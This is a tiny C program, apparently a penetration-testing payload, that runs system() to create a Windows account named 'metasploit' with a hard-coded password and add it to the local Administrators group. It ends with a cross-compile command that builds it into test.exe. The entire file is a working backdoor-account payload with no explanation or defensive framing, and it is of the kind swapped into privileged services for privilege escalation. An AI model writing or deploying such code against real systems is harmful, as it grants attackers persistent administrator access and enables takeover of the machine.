#include <stdlib.h>

int main() {
	int i;
	i=system("net user metasploit Metasploit$1 /ADD && net localgroup Administrators metasploit /ADD");
	return 0;
}

#i686-mingw32-msvc-gcc -o test.exe useradd.c
